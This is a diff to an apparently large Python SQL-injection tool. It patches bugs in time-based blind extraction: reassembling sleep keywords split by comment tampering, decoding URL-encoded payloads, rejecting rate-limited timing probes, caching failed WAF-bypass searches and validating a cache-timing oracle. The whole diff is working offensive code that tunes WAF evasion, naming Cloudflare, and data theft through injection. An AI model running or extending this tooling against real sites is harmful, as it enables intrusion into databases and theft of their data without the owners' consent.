@@ -58430,6 +58430,21 @@ class Scanner:
             chr(ord(c) - 0xFEE0) if 0xFF01 <= ord(c) <= 0xFF5E else c
             for c in _payload_for_sleep
         )
+        # BUG-KEYWORDSPLIT-SLEEP-FIX (HIGH): keywordsplit tamper inserts /*x*/ between keyword
+        # letters (e.g. SL/*comment*/EEP). After comment stripping, letters are separated by
+        # spaces (e.g. "Sl EeP"). The sleep regex requires contiguous keywords and cannot match
+        # split fragments. This causes sleep value extraction to fail \u2192 Inference falls back to
+        # config.time_sec (3.0s) \u2192 EBF uses wrong sleep \u2192 stricter WAF triggers \u2192 all extraction
+        # probes blocked. Evidence: log line 169 "No sleep value in detection payload".
+        # Fix: collapse inter-letter whitespace inside recognized SQL sleep function names.
+        # These are highly specific names so collapsing spaces inside them cannot produce FPs.
+        _payload_for_sleep = _re.sub(r'(?i)P\s*G\s*_\s*S\s*L\s*E\s*E\s*P', 'PG_SLEEP', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)(?<![A-Z_])S\s*L\s*E\s*E\s*P', 'SLEEP', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)W\s*A\s*I\s*T\s*F\s*O\s*R', 'WAITFOR', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)B\s*E\s*N\s*C\s*H\s*M\s*A\s*R\s*K', 'BENCHMARK', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*P\s*I\s*P\s*E', 'DBMS_PIPE', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*S\s*E\s*S\s*S\s*I\s*O\s*N', 'DBMS_SESSION', _payload_for_sleep)
+        _payload_for_sleep = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*L\s*O\s*C\s*K', 'DBMS_LOCK', _payload_for_sleep)
         _det_sleep_m = _re.search(
             r"pg_sleep\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)\s*\)"
             r"|SLEEP\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)\s*\)"
@@ -129899,12 +129914,22 @@ class TechniqueCascadeEngine:
             _bt_std = max(baseline.get("std_timing", 50) if isinstance(baseline, dict) else 50, 50)
             # FIX: Override time_threshold with 0.75 coefficient (same as T handler).
             # Default _payload_threshold uses 0.50 which is too loose for BT confirmation.
+            # BUG-KEYWORDSPLIT-SLEEP-FIX: keywordsplit tamper splits keywords with /*x*/ between
+            # letters (SL/*a*/EEP). After comment removal in detection, letters are separated
+            # by spaces in the stored payload. Collapse inter-letter whitespace before regex.
+            _bt_payload_for_sl = _re.sub(r'/\*!(?:\d+\s*)?(.*?)\*/', r'\1', payload, flags=_re.DOTALL)
+            _bt_payload_for_sl = _re.sub(r'/\*.*?\*/', ' ', _bt_payload_for_sl, flags=_re.DOTALL)
+            _bt_payload_for_sl = _re.sub(r'(?i)P\s*G\s*_\s*S\s*L\s*E\s*E\s*P', 'PG_SLEEP', _bt_payload_for_sl)
+            _bt_payload_for_sl = _re.sub(r'(?i)(?<![A-Z_])S\s*L\s*E\s*E\s*P', 'SLEEP', _bt_payload_for_sl)
+            _bt_payload_for_sl = _re.sub(r'(?i)W\s*A\s*I\s*T\s*F\s*O\s*R', 'WAITFOR', _bt_payload_for_sl)
+            _bt_payload_for_sl = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*P\s*I\s*P\s*E', 'DBMS_PIPE', _bt_payload_for_sl)
+            _bt_payload_for_sl = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*L\s*O\s*C\s*K', 'DBMS_LOCK', _bt_payload_for_sl)
             _bt_sl = _re.search(
                 r'pg_sleep\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)'
                 r'|(?<!\w)SLEEP\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)'
                 r'|WAITFOR\s+DELAY\s+[\'"]\d+:\d+:([\d.]+)'
                 r'|DBMS_(?:LOCK|PIPE)\.(?:SLEEP|RECEIVE_MESSAGE)\s*\([^,)]*,?\s*(0[xX][0-9a-fA-F]+|[\d.]+)',
-                payload, _re.I)
+                _bt_payload_for_sl, _re.I)
             if _bt_sl:
                 _bt_raw = next((g for g in _bt_sl.groups() if g is not None), None)
                 if _bt_raw:
@@ -152250,9 +152275,23 @@ class ExtractionBypassFinder:
                                     self.original + _false_p, tc)
                             except Exception: pass
                             _ew_false = (time.monotonic() - _t0_false) * 1000
-                            if _ew_false >= thresh:
+                            # BUG-EBF-P2-RATELIMIT-BASELINE FIX: Previously only checked absolute
+                            # thresh (2400ms). Rate-limiting can cause Phase 2 false probes to be
+                            # well above the Phase 1 structural false baseline (_elapsed_false) but
+                            # still under 2400ms (e.g. Phase 1 false=236ms, Phase 2 false=1335ms).
+                            # This accepted a rate-limited false as valid, leading to extraction where
+                            # even false-branch responses sleep (rate-limit latency > thresh) →
+                            # oracle always-True → 100% non-printable garbage characters.
+                            # Fix: also reject if Phase 2 false is > 3x Phase 1 structural false
+                            # baseline OR > 3x base_ms, whichever is larger.
+                            _p2_false_rate_limit = _ew_false > max(_elapsed_false * 3.0, self.base_ms * 3.0)
+                            if _ew_false >= thresh or _p2_false_rate_limit:
+                                _rl_note = (f" [rate-limit baseline: {_ew_false:.0f}ms "
+                                            f"> 3x_p1_false={_elapsed_false*3.0:.0f}ms]"
+                                            if _p2_false_rate_limit and _ew_false < thresh else "")
                                 print(f"[-] [EBF] {_wrap!r} tag={_tag!r} FALSE probe also "
-                                      f"slow ({_ew_false:.0f}ms{thresh:.0f}ms)  rate-limit FP, skipping")
+                                      f"slow ({_ew_false:.0f}ms vs thresh={thresh:.0f}ms{_rl_note})  "
+                                      f"rate-limit FP, skipping")
                                 continue
                             _working_wrapper = _wrap
                             _working_tag     = _tag
@@ -153049,25 +153088,39 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # Also restore EBF bypass state if it was cached from a previous call
         if _cal_key in _TB_EBF_CACHE:
             _cached_entry = _TB_EBF_CACHE[_cal_key]
-            _ebf_tmpl_cached    = _cached_entry[0]
-            _ebf_tc_cached      = _cached_entry[1]
-            _ebf_wrapper_cached = _cached_entry[2] if len(_cached_entry) > 2 else "{cond}"
-            _ebf_tag_cached     = _cached_entry[3] if len(_cached_entry) > 3 else ""
-            _ebf_nofunc_cached  = _cached_entry[4] if len(_cached_entry) > 4 else False
-            def _make_cached_ebf_payload(tmpl=_ebf_tmpl_cached,
-                                          wrap=_ebf_wrapper_cached,
-                                          tag=_ebf_tag_cached):
-                def _fn(condition):
-                    real_tag = "" if (tag == "nofunc") else tag
-                    obf = ExtractionBypassFinder.obfuscate_cond(condition, real_tag) if real_tag else condition
-                    wrapped = wrap.format(cond=obf)
-                    return tmpl.format(cond=wrapped)
-                return _fn
-            _ebf_mode[0]           = True
-            _ebf_payload_fn_ref[0] = _make_cached_ebf_payload()
-            _ebf_tc_ref[0]         = _ebf_tc_cached
-            _ebf_nofunc_ref[0]     = _ebf_nofunc_cached  # BUG-NOFUNC-REF-REASSIGN FIX: use index-assign to match siblings; full reassignment breaks any existing reference to the list object
-            LOG.info(f"[TBExtract] EBF restored: wrapper={_ebf_wrapper_cached!r} tag={_ebf_tag_cached!r} nofunc={_ebf_nofunc_cached}")
+            # BUG-EBF-RERUN-ON-FAILURE FIX: When EBF.find() exhausts all candidates and
+            # returns None, nothing was previously cached. On the next _time_based_extract_inner
+            # call (e.g. after garbage detection Case B clears calibration cache), EBF runs
+            # again and always finds the same result (None) — wasting 50-150 probes each time.
+            # In the log this caused EBF to run 3 times with identical all-blocked outcomes.
+            # Fix: store a "blocked" sentinel in _TB_EBF_CACHE when EBF returns None.
+            # When we see the sentinel here, skip EBF restore (keep _ebf_mode[0]=False)
+            # so the calibration block below also skips EBF re-run.
+            # The sentinel is self-healing: Case B garbage detection clears _TB_EBF_CACHE[_cal_key]
+            # (line ~154806-154807) so a retry after conditions change works correctly.
+            if _cached_entry == "blocked":
+                LOG.info("[TBExtract] EBF 'blocked' sentinel from cache — skipping EBF restore "
+                         "(previous run exhausted all candidates; will not re-run EBF)")
+            elif isinstance(_cached_entry, tuple) and len(_cached_entry) >= 2:
+                _ebf_tmpl_cached    = _cached_entry[0]
+                _ebf_tc_cached      = _cached_entry[1]
+                _ebf_wrapper_cached = _cached_entry[2] if len(_cached_entry) > 2 else "{cond}"
+                _ebf_tag_cached     = _cached_entry[3] if len(_cached_entry) > 3 else ""
+                _ebf_nofunc_cached  = _cached_entry[4] if len(_cached_entry) > 4 else False
+                def _make_cached_ebf_payload(tmpl=_ebf_tmpl_cached,
+                                              wrap=_ebf_wrapper_cached,
+                                              tag=_ebf_tag_cached):
+                    def _fn(condition):
+                        real_tag = "" if (tag == "nofunc") else tag
+                        obf = ExtractionBypassFinder.obfuscate_cond(condition, real_tag) if real_tag else condition
+                        wrapped = wrap.format(cond=obf)
+                        return tmpl.format(cond=wrapped)
+                    return _fn
+                _ebf_mode[0]           = True
+                _ebf_payload_fn_ref[0] = _make_cached_ebf_payload()
+                _ebf_tc_ref[0]         = _ebf_tc_cached
+                _ebf_nofunc_ref[0]     = _ebf_nofunc_cached  # BUG-NOFUNC-REF-REASSIGN FIX: use index-assign to match siblings; full reassignment breaks any existing reference to the list object
+                LOG.info(f"[TBExtract] EBF restored: wrapper={_ebf_wrapper_cached!r} tag={_ebf_tag_cached!r} nofunc={_ebf_nofunc_cached}")
     if not _skip_calibration:
         # Full calibration block 
 
@@ -153741,16 +153794,28 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # EBF is only needed if not already cached
                 _ebf_result = None  # reset for conditional block below
                 if not (_ebf_mode[0] and _ebf_payload_fn_ref[0] is not None):
-                    #  ExtractionBypassFinder: universal fallback
-                    # Constructs DBMS-native conditional templates, applies the same
-                    # mutation arsenal as WAFMLBypassGenerator, and tests each
-                    # variant until one calibrates.  Works for all DBMS + all WAFs.
-                    _ebf = ExtractionBypassFinder(
-                        engine, config, result, url, method,
-                        data, data_fmt,
-                        result.param if hasattr(result, "param") else "",
-                        original, tamper_chain, dbms, t, _base_time)
-                    _ebf_result = await _ebf.find()
+                    # BUG-EBF-RERUN-ON-FAILURE FIX: check for "blocked" sentinel before running.
+                    # When EBF previously exhausted all candidates (returned None), we cached
+                    # "blocked" in _TB_EBF_CACHE. Re-running EBF is unproductive — the WAF will
+                    # give the same result (same structural templates, same condition wrappers,
+                    # same WAF rules). Skip EBF re-run and report exhausted immediately.
+                    # The sentinel is cleared by Case B garbage detection so a retry after
+                    # conditions change (e.g. different tamper chain, WAF rule update) will work.
+                    if _TB_EBF_CACHE.get(_cal_key) == "blocked":
+                        print("[!] [TBExtract] ExtractionBypassFinder previously exhausted "
+                              "(cached 'blocked' sentinel) — skipping EBF re-run", flush=True)
+                        _ebf_result = None
+                    else:
+                        #  ExtractionBypassFinder: universal fallback
+                        # Constructs DBMS-native conditional templates, applies the same
+                        # mutation arsenal as WAFMLBypassGenerator, and tests each
+                        # variant until one calibrates.  Works for all DBMS + all WAFs.
+                        _ebf = ExtractionBypassFinder(
+                            engine, config, result, url, method,
+                            data, data_fmt,
+                            result.param if hasattr(result, "param") else "",
+                            original, tamper_chain, dbms, t, _base_time)
+                        _ebf_result = await _ebf.find()
                 else:
                     _ebf_result = "cached"  # sentinel so the `if _ebf_result:` below fires
                 if _ebf_result == "cached":
@@ -153814,6 +153879,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 else:
                     print("[!] [TBExtract] ExtractionBypassFinder exhausted  "
                           "verify injection is still active or try --time-sec higher", flush=True)
+                    # BUG-EBF-RERUN-ON-FAILURE FIX: cache a "blocked" sentinel so subsequent
+                    # calls for the same URL/param/sleep skip EBF re-run immediately.
+                    # EBF always finds the same result for the same target+WAF configuration,
+                    # so re-running wastes 50-150 probes with identical outcome.
+                    # The sentinel is a string (not a tuple), which the cache-restore code
+                    # above (line ~153064) guards against with `isinstance(_cached_entry, tuple)`.
+                    # It is cleared by Case B garbage detection (del _TB_EBF_CACHE[_cal_key])
+                    # so a retry after conditions change is still possible.
+                    _tb_cache_insert(_TB_EBF_CACHE, _cal_key, "blocked", _TB_EBF_CACHE_MAX)
         else:
             LOG.warning("[TBExtract] Calibration blocked, no detection payload available")
 
@@ -158838,6 +158912,21 @@ class ExtractionOrchestrator:
         # with _BDET_NUM equivalents that correctly match `1e0`, `1E-0`, `2.5e3`, etc.
         # Ordering: specific ISNULL/IS-NULL patterns precede numeric forms for priority.
         _dt_num = r'(?:\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)'  # integer/decimal/scientific float
+        # Pre-compute comment-stripped body and BT SELECT-WHERE detection so both the
+        # _cond_pat fallback block and the bare-timing check can use them without re-computing.
+        _body_upper_dt = (_body or "").upper()
+        _body_nocomment_dt = _re.sub(r'/\*!?\d*\s*', ' ', _body_upper_dt)
+        _body_nocomment_dt = _re.sub(r'\*/', ' ', _body_nocomment_dt)
+        _body_nocomment_dt = _re.sub(r'\s+', ' ', _body_nocomment_dt)
+        # Reassemble keywords fragmented by keywordsplit (e.g. WH ERE → WHERE)
+        _body_nocomment_dt = _re.sub(r'W\s+H\s*E\s*R\s*E\b|W\s*H\s+E\s*R\s*E\b|W\s*H\s*E\s+R\s*E\b|W\s*H\s*E\s*R\s+E\b', 'WHERE', _body_nocomment_dt)
+        _body_nocomment_dt = _re.sub(r'S\s*E\s*L\s*E\s*C\s*T\b', 'SELECT', _body_nocomment_dt)
+        _body_nocomment_dt = _re.sub(r'(?<![A-Z_])S\s*L\s*E\s*E\s*P\s*\(', 'SLEEP(', _body_nocomment_dt)
+        _body_nocomment_dt = _re.sub(r'P\s*G\s*_\s*S\s*L\s*E\s*E\s*P\s*\(', 'PG_SLEEP(', _body_nocomment_dt)
+        _bt_select_where = bool(
+            _re.search(r'SELECT\s+.*(?:SLEEP|PG_SLEEP)\s*\(', _body_nocomment_dt) and
+            _re.search(r'(?:SLEEP|PG_SLEEP)\s*\(.*\).*WHERE\b', _body_nocomment_dt)
+        )
         _cond_pat = re.search(
             rf'(\(\s*)?('
             r'ISNULL\s*\(\s*NULL\s*\)'
@@ -158856,11 +158945,59 @@ class ExtractionOrchestrator:
             rf'|{_dt_num}\s*<>\s*{_dt_num}|{_dt_num}\s*!=\s*{_dt_num}'
             r')(\s*\))?',
             _body, re.I)
+        if not _cond_pat:
+            # BUG-BT-COND-PAT-WHERE-FIX (HIGH): BT payloads use `(SELECT SLEEP(t) WHERE {cond})`
+            # where {cond} is an always-true function-call comparison like
+            # `COALESCE(0x1,0x0)=ABS(1)`. The numeric-literal _cond_pat above only matches
+            # simple forms (1=1, TRUE, 1e0=1e0). For BT SELECT-WHERE form payloads, perform
+            # a secondary regex search that targets the condition after the WHERE keyword
+            # (after comment stripping), finding the span in _body to replace.
+            # We search the stripped body to find position offsets, then translate back to
+            # the original _body using character count up to the comment-stripped WHERE.
+            if _bt_select_where:
+                # Find WHERE position in the stripped body and use the remainder as condition
+                _bwhere_m = _re.search(r'\b(?:WH\s*ERE|WHERE)\b\s*', _body_nocomment_dt)
+                if _bwhere_m:
+                    # Find the last WHERE occurrence before end (in the comment-stripped body)
+                    _bwhere_all = list(_re.finditer(r'\b(?:WH\s*ERE|WHERE)\b\s*', _body_nocomment_dt))
+                    _bwhere_last = _bwhere_all[-1] if _bwhere_all else None
+                    if _bwhere_last:
+                        _bt_cond_stripped = _body_nocomment_dt[_bwhere_last.end():].rstrip(')')
+                        # Find the WHERE in the original _body, handling keywordsplit
+                        # (WH/*comment*/ERE) and plain WHERE forms.
+                        _orig_where_matches = list(_re.finditer(
+                            r'W\s*H\s*(?:/\*[^*]*\*/)?\s*E\s*R\s*E|WHERE', _body, _re.I))
+                        if _orig_where_matches:
+                            _orig_last_where = _orig_where_matches[-1]
+                            _cond_start = _orig_last_where.end()
+                            # The condition continues until the matching ) or end of body
+                            # Find the closing paren depth starting from end of WHERE
+                            _bt_cond_body = _body[_cond_start:]
+                            _depth = 0
+                            _bt_cond_end = len(_bt_cond_body)
+                            for _ci, _ch in enumerate(_bt_cond_body):
+                                if _ch == '(':
+                                    _depth += 1
+                                elif _ch == ')':
+                                    if _depth == 0:
+                                        _bt_cond_end = _ci
+                                        break
+                                    _depth -= 1
+                            _bt_cond_orig = _bt_cond_body[:_bt_cond_end].strip()
+                            if _bt_cond_orig:
+                                # Replace the WHERE condition with [INFERENCE]
+                                _tmpl = (_body[:_cond_start] + ' [INFERENCE]' +
+                                         _body[_cond_start + _bt_cond_end:] + _suffix)
+                                _cond_pat = True  # sentinel to skip the else branch
+                                LOG.debug("[DetTemplate] BT WHERE condition replaced: %r→[INFERENCE]",
+                                          _bt_cond_orig[:60])
         if _cond_pat:
-            _pre  = _cond_pat.group(1) or ""
-            _post = _cond_pat.group(3) or ""
-            _tmpl = (_body[:_cond_pat.start()] + _pre + "[INFERENCE]" +
-                     _post + _body[_cond_pat.end():] + _suffix)
+            if not isinstance(_cond_pat, bool):
+                _pre  = _cond_pat.group(1) or ""
+                _post = _cond_pat.group(3) or ""
+                _tmpl = (_body[:_cond_pat.start()] + _pre + "[INFERENCE]" +
+                         _post + _body[_cond_pat.end():] + _suffix)
+            # else: _tmpl already set by BT WHERE path above
         else:
             # FIX-EXTRACT-VIA-DT-TEMPLATE-FALLBACK (Req 7/8): Mirror _build_det_template bare-timing detection.
             # Appending " AND [INFERENCE]" to timing payloads with no replaceable static condition is broken:
@@ -158868,7 +159005,7 @@ class ExtractionOrchestrator:
             #   * DBMS_PIPE.RECEIVE_MESSAGE AND [INFERENCE] -> ORA-00933
             #   * ALL_OBJECTS cross-join AND [INFERENCE] -> timing fires regardless of inference condition
             # Return "" so caller falls through to DBMS-aware inline extraction.
-            _body_upper_dt = (_body or "").upper()
+            # _body_upper_dt and _bt_select_where are already computed above the _cond_pat search.
             _is_bare_timing_dt = (
                 "WAITFOR" in _body_upper_dt or
                 "DBMS_PIPE.RECEIVE_MESSAGE" in _body_upper_dt or
@@ -158880,9 +159017,9 @@ class ExtractionOrchestrator:
                 "RANDOMBLOB(" in _body_upper_dt or
                 "ZEROBLOB(" in _body_upper_dt or
                 ("SLEEP(" in _body_upper_dt and "CASE WHEN" not in _body_upper_dt
-                 and "IF(" not in _body_upper_dt) or
+                 and "IF(" not in _body_upper_dt and not _bt_select_where) or
                 ("PG_SLEEP(" in _body_upper_dt and "CASE WHEN" not in _body_upper_dt
-                 and "IF(" not in _body_upper_dt) or
+                 and "IF(" not in _body_upper_dt and not _bt_select_where) or
                 ("BENCHMARK(" in _body_upper_dt and "IF(" not in _body_upper_dt)
             )
             if _is_bare_timing_dt:
@@ -159589,6 +159726,32 @@ class ExtractionOrchestrator:
         # this value, not a hardcoded escalation.  Cloudflare (and similar WAFs)
         # block larger sleeps even when a small sleep passed through detection.
         _det_pl = getattr(self.result, "payload", "") or ""
+        # BUG-ORCH-SLEEP-URLDECODE FIX (HIGH): result.payload may be stored in URL-encoded form
+        # (e.g. 'SlEeP' obfuscated as '%53lEeP' or similar percent-encoding to evade WAF during
+        # detection). The sleep extraction regex below runs on the raw payload string, so URL-encoded
+        # keywords are not matched → _raw_sleep=0.0 → Orchestrator uses jitter_floor (3.0s) instead
+        # of the actual payload sleep value (2.0s for SLEEP(0x2)). This causes extraction engines to
+        # operate with sleep=3.0s, triggering stricter WAF rules that passed with sleep=2.0s,
+        # causing all extraction probes to be blocked. Fix: double-decode the payload (same as
+        # _time_based_extract_inner at line ~152693) before the regex search. Also strip inline SQL
+        # comments (/**/ fragments from TamperLib mutations) for cleaner keyword matching.
+        try:
+            _det_pl_decoded = unquote(unquote(_det_pl))
+            _det_pl_nodoc = _re.sub(r'/\*[^*]*\*/', ' ', _det_pl_decoded)
+            _det_pl_search = _re.sub(r'\s+', ' ', _det_pl_nodoc).strip()
+            # BUG-KEYWORDSPLIT-SLEEP-FIX (HIGH): keywordsplit tamper splits keywords with
+            # /*x*/ between letters. After comment strip, letters are separated by spaces
+            # (e.g. "Sl EeP") making the sleep regex unable to match. Collapse inter-letter
+            # whitespace inside recognized SQL sleep function names before regex search.
+            _det_pl_search = _re.sub(r'(?i)P\s*G\s*_\s*S\s*L\s*E\s*E\s*P', 'PG_SLEEP', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)(?<![A-Z_])S\s*L\s*E\s*E\s*P', 'SLEEP', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)W\s*A\s*I\s*T\s*F\s*O\s*R', 'WAITFOR', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)B\s*E\s*N\s*C\s*H\s*M\s*A\s*R\s*K', 'BENCHMARK', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*P\s*I\s*P\s*E', 'DBMS_PIPE', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*S\s*E\s*S\s*S\s*I\s*O\s*N', 'DBMS_SESSION', _det_pl_search)
+            _det_pl_search = _re.sub(r'(?i)D\s*B\s*M\s*S\s*_\s*L\s*O\s*C\s*K', 'DBMS_LOCK', _det_pl_search)
+        except Exception:
+            _det_pl_search = _det_pl
         _sl_m = _re.search(
             r"pg_sleep\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)"
             r"|SLEEP\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)"
@@ -159602,7 +159765,7 @@ class ExtractionOrchestrator:
             r"|DBMS_SESSION\.SLEEP\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)\)"
             r"|DBMS_LOCK\.SLEEP\s*\(\s*(0[xX][0-9a-fA-F]+|[\d.]+)\)"
             r"|BENCHMARK\s*\(\s*(\d+)",
-            _det_pl, _re.IGNORECASE)
+            _det_pl_search, _re.IGNORECASE)
         if _sl_m:
             _g = next((g for g in _sl_m.groups() if g is not None), None)
             if _g:
@@ -160558,16 +160721,36 @@ class ExtractionOrchestrator:
                 # Fix: when ACTIVE is already True (we own it), call _time_based_extract_inner
                 # directly, bypassing the outer lock wrapper entirely (the lock is either
                 # already held by V25's _extraction_first, or owned implicitly by V13/V14).
-                if _EXTRACTION_ACTIVE[0]:
-                    _tbe_result = await _time_based_extract_inner(
-                        self.engine, self.config, self.result, sql_query,
-                        self.method, self.url, self.data, self.data_fmt,
-                        self.original, self.tamper_chain, dbms, self.baseline)
-                else:
-                    _tbe_result = await _time_based_extract(
-                        self.engine, self.config, self.result, sql_query,
-                        self.method, self.url, self.data, self.data_fmt,
-                        self.original, self.tamper_chain, dbms, self.baseline)
+                # BUG-TBE-SLEEP-MISMATCH-FIX (HIGH): _time_based_extract_inner uses
+                # config.time_sec (user-specified, e.g. 3.0s) for EBF template construction
+                # and binary-search thresholds. But the detection payload may have used a
+                # different sleep value (e.g. SLEEP(0x2)=2.0s extracted after URL-decode
+                # and keywordsplit fixes). EBF built with SLEEP(3) hits WAF rules that
+                # SLEEP(2) evaded during detection, causing all EBF probes to block.
+                # Fix: temporarily set config.time_sec to the payload-extracted sleep so
+                # EBF and all inner timing logic use the same sleep the WAF already allowed.
+                _orig_tbe_time_sec = self.config.time_sec
+                _confirmed_sleep = getattr(self, '_confirmed_sleep_sec', None)
+                if _confirmed_sleep and abs(_confirmed_sleep - _orig_tbe_time_sec) > 0.05:
+                    self.config.time_sec = _confirmed_sleep
+                    self.config._pre_extract_time_sec = float(_orig_tbe_time_sec)
+                    LOG.info("[Orchestrator] TBE fallback: overriding config.time_sec "
+                             "%.3f→%.3f (payload-extracted sleep)", _orig_tbe_time_sec, _confirmed_sleep)
+                try:
+                    if _EXTRACTION_ACTIVE[0]:
+                        _tbe_result = await _time_based_extract_inner(
+                            self.engine, self.config, self.result, sql_query,
+                            self.method, self.url, self.data, self.data_fmt,
+                            self.original, self.tamper_chain, dbms, self.baseline)
+                    else:
+                        _tbe_result = await _time_based_extract(
+                            self.engine, self.config, self.result, sql_query,
+                            self.method, self.url, self.data, self.data_fmt,
+                            self.original, self.tamper_chain, dbms, self.baseline)
+                finally:
+                    self.config.time_sec = _orig_tbe_time_sec
+                    if hasattr(self.config, '_pre_extract_time_sec'):
+                        del self.config._pre_extract_time_sec
                 if _tbe_result:
                     # BUG-ORCHESTRATOR-GARBAGE-ACCEPT FIX (HIGH): The fallback accepted
                     # any truthy result from _time_based_extract without validating it.
@@ -168780,18 +168963,36 @@ class NovelWAFBypassExtractor:
                         _vf_status = getattr(_vf_fp2, 'status_code', 200) or 200
                         print("[+] [Novel] Cache oracle validation: TRUE=%.0fms(status=%d) FALSE=%.0fms(status=%d) threshold=%.0fms" % (
                             _vt_ms, _vt_status, _vf_ms, _vf_status, _threshold))
-                        # BUG-V214-D FIX: When validation probes are WAF-blocked (status 400/403/429),
-                        # the plain CASE WHEN SQL was blocked but extraction SQL uses the bypass technique
-                        # which may still work. Treat WAF-blocked validation as indeterminate (let
-                        # extraction proceed) rather than aborting the oracle entirely.
-                        # The original code saw both validation probes returning fast (~50ms WAF block
-                        # speed), which failed the `_vt_ms > _threshold` test → _do_extract = False →
-                        # cache oracle aborted even though the bypass technique CAN distinguish TRUE/FALSE.
+                        # BUG-CACHE-ORACLE-BOTH-BLOCKED-FIX (HIGH): When BOTH validation probes
+                        # are WAF-blocked (status 400/403/429) AND the true probe does not exceed
+                        # the cache threshold, the oracle is non-functional — WAF is blocking ALL
+                        # SQL injection before it reaches the cache layer. Proceeding wastes 30+
+                        # extraction probes and causes rate-limiting (each 403 response ratchets the
+                        # StealthEngine backoff). The old BUG-V214-D FIX was correct for the case
+                        # where only ONE probe is blocked, but wrong when BOTH are blocked with
+                        # true timing that fails the threshold test — in that case the "bypass
+                        # technique in actual extraction" is the same cache oracle mechanism, which
+                        # is already proven not to bypass the WAF (both probes blocked).
+                        # Fix: if both blocked AND true probe fails the threshold test, abort.
+                        # If both blocked AND true probe EXCEEDS threshold, the cache DOES respond
+                        # to true conditions (the 403 still came from the cache layer or app layer
+                        # AFTER cache evaluation), so extraction may still work.
                         if _vt_status in (400, 403, 429) and _vf_status in (400, 403, 429):
-                            print("[+] [Novel] Cache oracle validation probes WAF-blocked "
-                                  "(status %d/%d) — proceeding with extraction "
-                                  "(bypass technique in actual extraction may succeed)" % (_vt_status, _vf_status))
-                            # Keep _do_extract = True (set above); don't abort on blocked validation
+                            if _vt_ms > _threshold:
+                                # True probe exceeds threshold despite 403 — cache-layer timing
+                                # still distinguishable; extraction may succeed with injected SQL
+                                print("[+] [Novel] Cache oracle validation probes WAF-blocked "
+                                      "(status %d/%d) but TRUE=%.0fms > threshold=%.0fms — "
+                                      "cache-layer timing detectable, proceeding" % (
+                                      _vt_status, _vf_status, _vt_ms, _threshold))
+                            else:
+                                # Both blocked AND true probe doesn't exceed threshold → WAF blocks
+                                # before cache evaluation. Any extraction probes will also be blocked.
+                                _do_extract = False
+                                print("[-] [Novel] Cache oracle both validation probes WAF-blocked "
+                                      "(status %d/%d, TRUE=%.0fms ≤ threshold=%.0fms) — "
+                                      "WAF blocks before cache; aborting cache oracle to avoid "
+                                      "rate-limit ratchet" % (_vt_status, _vf_status, _vt_ms, _threshold))
                         elif not (_vt_ms > _threshold and _vf_ms <= _threshold):
                             _do_extract = False
                             print("[+] [Novel] Cache oracle cannot discriminate TRUE/FALSE — skipping extraction")
